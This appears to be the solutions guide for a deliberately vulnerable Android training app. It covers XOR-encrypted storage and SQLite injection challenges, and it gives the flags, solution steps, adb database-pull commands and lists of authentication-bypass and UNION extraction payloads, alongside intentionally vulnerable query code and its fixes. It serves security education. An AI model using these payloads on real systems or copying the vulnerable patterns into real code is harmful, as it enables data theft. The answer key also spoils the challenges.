### Challenge 6: Insecure Data Storage 3 (Medium)
**Difficulty**: Medium  
**Vulnerability Type**: Weak XOR encryption with hardcoded key  
**Flag Location**: `InsecureData3Model.java`  
**Encryption Key**: `SHEPHERD`  

**FLAG**: `SecureFlag{WeakXOR_Crypto_2024}`

**Solution Steps**:
1. Decompile APK using jadx:
   ```
   jadx-gui app-debug.apk
   ```
2. Navigate to `com.owasp.app.ui.challenges.insecuredata3.InsecureData3Fragment`
3. Find the hardcoded XOR_KEY constant or encrypted data
4. Use XOR decryption to reveal the flag

**XOR Decryption Script (Python)**:
```python
def xor_decrypt(data, key):
    result = ""
    for i in range(len(data)):
        result += chr(ord(data[i]) ^ ord(key[i % len(key)]))
    return result

key = "SHEPHERD"
# Find encrypted data in app and decrypt
plaintext = xor_decrypt(encrypted_data, key)
```

```java

private static final byte[] F1 = {79, 87, 65, 83, 80, 123}; // OWASP{
```

   ```python
   f2 = bytes([69, 67, 66, 95, 77]).decode('ascii')
   f3 = bytes([48, 100, 51, 95]).decode('ascii')
   f4 = bytes([86, 117, 108, 110]).decode('ascii')
   ```

### Current Implementation
All keys are currently hardcoded for educational purposes. Here are strategies to make them harder to find:

### 1. String Obfuscation (Recommended for Education)
```java
// Instead of: String key = "SHEPHERD";
private String getObfuscatedKey() {
    return new StringBuilder()
        .append((char)83)  // S
        .append((char)72)  // H
        .append((char)69)  // E
        .append((char)80)  // P
        .append((char)72)  // H
        .append((char)69)  // E
        .append((char)82)  // R
        .append((char)68)  // D
        .toString();
}
```

### 2. ProGuard/R8 Obfuscation
Enable in `build.gradle`:
```gradle
buildTypes {
    release {
        minifyEnabled true
        shrinkResources true
        proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
    }
}
```

### 3. Native Code (JNI) - Most Secure
Store keys in native C/C++ libraries:
```c
extern "C" JNIEXPORT jstring JNICALL
Java_com_owasp_reverser_getSecretKey(JNIEnv* env, jobject) {
    return env->NewStringUTF("SHEPHERD");
}
```

### 4. Split Keys Across Methods
```java
private String getPart1() { return "SHEP"; }
private String getPart2() { return "HERD"; }
private String getFullKey() { return getPart1() + getPart2(); }
```

### 5. Runtime Generation
```java
private String generateKey() {
    char[] chars = {'S','H','E','P','H','E','R','D'};
    return new String(chars);
}
```

### 6. Base64 Encoding (Minimal Security)
```java
private static final String B64_KEY = "U0hFUEhFUkQ=";
private String getKey() {
    return new String(Base64.decode(B64_KEY, Base64.DEFAULT));
}
```

## EDUCATIONAL NOTES

### Why These Vulnerabilities Matter

1. **SQLite Databases**: Many apps store sensitive data in unencrypted SQLite databases
2. **SharedPreferences**: Developers often mistakenly believe this is secure storage
3. **Weak Hashing**: MD5 is cryptographically broken and should never be used for passwords
4. **Base64 ≠ Encryption**: Base64 is encoding, not encryption, and provides no security
5. **Custom Crypto**: Never implement your own cryptography - use proven libraries
6. **Hardcoded Secrets**: Keys in code can always be extracted through reverse engineering

### Secure Alternatives

1. **Android Keystore**: Hardware-backed key storage
2. **EncryptedSharedPreferences**: Built-in encrypted preferences (Android 6.0+)
3. **SQLCipher**: Encrypted SQLite database
4. **bcrypt/Argon2**: Modern password hashing algorithms
5. **Server-side secrets**: Never store production secrets in mobile apps

## CLIENT-SIDE SQL INJECTION CHALLENGES (NEW)

### Lesson 11: Client-Side Injection Lesson
**Difficulty**: Basic  
**Vulnerability Type**: SQLite Injection  
**Hidden Flag**: `FLAG{CL13NT_S1D3_SQL_1NJ3CT10N}`  
**Location**: `ClientSideInjectionLessonFragment.java`

**Description**:
Educational lesson teaching SQL injection in client-side SQLite databases. Demonstrates
how concatenating user input into SQL queries creates vulnerabilities.

**Vulnerable Code Pattern**:
```java
// VULNERABLE - Never do this!
String query = "SELECT * FROM users WHERE username LIKE '%" + searchTerm + "%'";
cursor = db.rawQuery(query, null);
```

**Solution Steps**:
1. Enter search term: `test`
2. Normal search returns matching users
3. Try SQL injection: `%' OR '1'='1`
4. This makes the query always true
5. All users are returned, including hidden superadmin
6. The superadmin's full_name field contains the flag
7. **Flag**: `FLAG{CL13NT_S1D3_SQL_1NJ3CT10N}`

**Exploitation**:
```
Input: %' OR '1'='1
Query becomes:
SELECT * FROM users WHERE username LIKE '%%' OR '1'='1%'
Result: Returns all 5 users including superadmin
```

**Database Schema**:
```sql
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL,
    email TEXT NOT NULL,
    full_name TEXT,
    is_admin INTEGER DEFAULT 0
)

-- Hidden user with flag
INSERT INTO users VALUES (5, 'superadmin', 'super@app.com', 'FLAG{CL13NT_S1D3_SQL_1NJ3CT10N}', 1);
```

**Learning Objectives**:
- Understand SQL injection in mobile apps
- Learn string concatenation vulnerabilities
- Practice SQL injection payloads
- Understand parameterized queries as mitigation

### Challenge 14: Client-Side Injection 1 (Medium)
**Difficulty**: Medium  
**Vulnerability Type**: SQL Injection (Authentication Bypass)  
**FLAG**: `SourHatsAndAngryCats`  
**Location**: `ClientSideInjectionChallenge1Fragment.java`, `ClientSideInjectionChallenge1Model.java`

**Description**:
Exploit SQL injection to bypass login authentication and retrieve the admin password.
The password itself is the flag.

**Vulnerable Code Pattern**:
```java
// VULNERABLE - Building query with string concatenation
String query = "SELECT username, password, role, balance FROM accounts " +
               "WHERE username = '" + username + "' AND password = '" + password + "'";
cursor = db.rawQuery(query, null);
```

**Database Schema**:
```sql
CREATE TABLE accounts (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL,
    password TEXT NOT NULL,
    role TEXT,
    balance INTEGER DEFAULT 0
)

-- Sample data
INSERT INTO accounts VALUES (1, 'user1', 'password123', 'Regular User', 100);
INSERT INTO accounts VALUES (2, 'user2', 'qwerty456', 'Another User', 250);
INSERT INTO accounts VALUES (3, 'guest', 'guest', 'Guest Account', 0);

-- Target admin account
INSERT INTO accounts VALUES (4, 'admin', 'SourHatsAndAngryCats', 'System Administrator', 9999);
```

**Solution Steps**:

**Method 1: Comment-based Injection**
1. Username: `admin'--`
2. Password: `anything`
3. Resulting query:
   ```sql
   SELECT * FROM accounts WHERE username = 'admin'--' AND password = 'anything'
   ```
4. The `--` comments out the password check
5. Login successful, admin password displayed in results
6. **Flag**: `SourHatsAndAngryCats`

**Method 2: OR-based Injection (Returns all accounts)**
1. Username: `' OR '1'='1`
2. Password: `' OR '1'='1`
3. Resulting query:
   ```sql
   SELECT * FROM accounts WHERE username = '' OR '1'='1' AND password = '' OR '1'='1'
   ```
4. Returns all accounts including admin
5. Admin password visible in results
6. **Flag**: `SourHatsAndAngryCats`

**Method 3: Targeted OR Injection**
1. Username: `' OR username='admin`
2. Password: `' OR '1'='1`
3. Specifically targets admin account
4. **Flag**: `SourHatsAndAngryCats`

**Exploitation Payloads**:
```
# Authentication bypass payloads
admin'--
admin'#
admin' OR '1'='1'--
' OR 1=1--
' OR 'x'='x
admin' AND '1'='1

# Extract all users
' OR '1'='1
' UNION SELECT * FROM accounts--
```

**Tools Required**:
- None (exploit through app UI)
- Optional: adb for database inspection

**Advanced Analysis**:
```bash
# Pull database for offline analysis
adb shell run-as com.owasp.app
cd databases/
cp challenge1_injection.db /sdcard/
exit
adb pull /sdcard/challenge1_injection.db

# Query with sqlite3
sqlite3 challenge1_injection.db
.schema accounts
SELECT * FROM accounts WHERE username='admin';
```

**Learning Objectives**:
- Authentication bypass via SQL injection
- Comment injection techniques
- OR-based boolean manipulation
- Understanding AND/OR precedence in SQL
- Why parameterized queries are essential

**Mitigation**:
```java
// SECURE - Use parameterized queries
String[] selectionArgs = {username, password};
Cursor cursor = db.query("accounts", 
    null, 
    "username = ? AND password = ?", 
    selectionArgs, 
    null, null, null);
```

### Challenge 15: Client-Side Injection 2 (Hard)
**Difficulty**: Hard  
**Vulnerability Type**: UNION-based SQL Injection  
**FLAG**: `BurpingChimneys`  
**Location**: `ClientSideInjectionChallenge2Fragment.java`, `ClientSideInjectionChallenge2Model.java`

**Description**:
Advanced UNION-based SQL injection to extract data from a hidden database table.
Demonstrates cross-table data extraction using UNION SELECT.

**Vulnerable Code Pattern**:
```java
// VULNERABLE - User input in LIKE clause
String query = "SELECT name, category, price, stock FROM products " +
               "WHERE name LIKE '%" + searchTerm + "%' OR category LIKE '%" + searchTerm + "%'";
cursor = db.rawQuery(query, null);
```

**Database Schema**:
```sql
-- Visible table
CREATE TABLE products (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT NOT NULL,
    category TEXT,
    price REAL,
    stock INTEGER DEFAULT 0
)

-- Sample products
INSERT INTO products VALUES (1, 'Laptop', 'Electronics', 999.99, 15);
INSERT INTO products VALUES (2, 'Mouse', 'Electronics', 29.99, 50);
INSERT INTO products VALUES (3, 'Keyboard', 'Electronics', 79.99, 30);
INSERT INTO products VALUES (4, 'Monitor', 'Electronics', 299.99, 20);
INSERT INTO products VALUES (5, 'Desk', 'Furniture', 199.99, 10);

-- Hidden secrets table (NOT accessible through normal UI)
CREATE TABLE secrets (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    secret_key TEXT NOT NULL,
    secret_value TEXT NOT NULL
)

-- Hidden secrets
INSERT INTO secrets VALUES (1, 'admin_token', 'BurpingChimneys');
INSERT INTO secrets VALUES (2, 'api_key', 'sk_test_1234567890');
```

**Solution Steps**:

**Step 1: Determine Column Count**
1. Input: `' ORDER BY 4--`
2. Success → 4 columns exist
3. Input: `' ORDER BY 5--`
4. Error → Only 4 columns

**Step 2: Test UNION Compatibility**
1. Input: `' UNION SELECT NULL,NULL,NULL,NULL--`
2. Success → UNION works with 4 NULLs

**Step 3: Enumerate Tables (Optional)**
1. Input: `' UNION SELECT name,'table',NULL,NULL FROM sqlite_master WHERE type='table'--`
2. Result shows: `products`, `secrets`
3. Hidden 'secrets' table discovered!

**Step 4: Extract Secrets Schema (Optional)**
1. Input: `' UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master WHERE name='secrets'--`
2. Reveals: `secret_key` and `secret_value` columns

**Step 5: Extract Admin Token (The Flag)**
1. Input: `' UNION SELECT secret_key, secret_value, NULL, NULL FROM secrets--`
2. Results display all secrets:
   - admin_token: **BurpingChimneys** ← This is the flag!
   - api_key: sk_test_1234567890
3. **FLAG**: `BurpingChimneys`

**Alternative Targeted Extraction**:
```sql
# Directly target admin_token
Input: ' UNION SELECT secret_key, secret_value, NULL, NULL FROM secrets WHERE secret_key='admin_token'--

# Formatted output
Input: ' UNION SELECT secret_key || ': ' || secret_value, 'extracted', NULL, NULL FROM secrets--

# Multiple secrets at once
Input: ' UNION SELECT secret_key, secret_value, 'SECRET', 0 FROM secrets--
```

**UNION Injection Requirements**:
1. **Same column count**: UNION must have same number of columns
2. **Compatible types**: Use NULL for unknown/incompatible types
3. **Proper termination**: Use `--` to comment out rest of query
4. **Column alignment**: Ensure data types roughly match

**Exploitation Techniques**:

**Database Enumeration**:
```sql
# List all tables
' UNION SELECT name,type,NULL,NULL FROM sqlite_master--

# Get table schema
' UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master WHERE name='secrets'--

# Count rows in table
' UNION SELECT COUNT(*),NULL,NULL,NULL FROM secrets--

# Extract specific columns
' UNION SELECT secret_key, secret_value, NULL, NULL FROM secrets--
```

**SQLite-Specific Tricks**:
```sql
# Concatenate columns
' UNION SELECT secret_key || ': ' || secret_value, NULL, NULL, NULL FROM secrets--

# Conditional extraction
' UNION SELECT secret_value, NULL, NULL, NULL FROM secrets WHERE secret_key='admin_token'--

# Use LIMIT for pagination
' UNION SELECT secret_key, secret_value, NULL, NULL FROM secrets LIMIT 1 OFFSET 0--
```

**Common SQLite System Tables**:
- `sqlite_master`: Contains database schema
- `sqlite_sequence`: Auto-increment values
- `sqlite_stat1`: Statistics for query optimizer

**Tools Required**:
- None (exploit through app UI)
- Optional: DB Browser for SQLite, adb

**Advanced Analysis**:
```bash
# Extract database
adb shell run-as com.owasp.app
cd databases/
cp challenge2_injection.db /sdcard/
exit
adb pull /sdcard/challenge2_injection.db

# Analyze with sqlite3
sqlite3 challenge2_injection.db

# Useful SQLite commands
.tables                              # List all tables
.schema secrets                      # Show table schema
SELECT * FROM sqlite_master;         # View all database objects
SELECT * FROM secrets;               # Extract all secrets
SELECT secret_value FROM secrets 
WHERE secret_key='admin_token';      # Target specific secret
```

**Learning Objectives**:
- UNION-based SQL injection
- Cross-table data extraction
- Database structure enumeration
- Column count matching techniques
- SQLite system tables exploitation
- Advanced payload construction

**Why This Is Dangerous**:
1. Bypasses application logic to access hidden tables
2. Can extract any data from any table
3. No authentication required
4. Difficult to detect without proper logging
5. Can lead to complete database compromise

**Mitigation**:
```java
// SECURE METHOD 1 - Parameterized Query
String[] selectionArgs = {searchTerm, searchTerm};
Cursor cursor = db.query("products", 
    new String[]{"name", "category", "price", "stock"},
    "name LIKE ? OR category LIKE ?", 
    selectionArgs, 
    null, null, null);

// SECURE METHOD 2 - SQLiteQueryBuilder
SQLiteQueryBuilder builder = new SQLiteQueryBuilder();
builder.setTables("products");
Cursor cursor = builder.query(db, 
    projection, 
    selection, 
    selectionArgs, 
    null, null, sortOrder);

// SECURE METHOD 3 - Input Validation + Parameterization
String sanitized = searchTerm.replaceAll("[^a-zA-Z0-9\\s]", "");
String[] args = {"%" + sanitized + "%", "%" + sanitized + "%"};
String query = "SELECT name, category, price, stock FROM products " +
               "WHERE name LIKE ? OR category LIKE ?";
cursor = db.rawQuery(query, args);
```

**Defense Layers**:
1. **Input Validation**: Whitelist allowed characters
2. **Parameterized Queries**: Use prepared statements ALWAYS
3. **Least Privilege**: Limit database permissions
4. **Error Handling**: Don't leak schema info in errors
5. **Logging**: Monitor for suspicious patterns
6. **ORM Usage**: Use Room or other ORMs with built-in protection
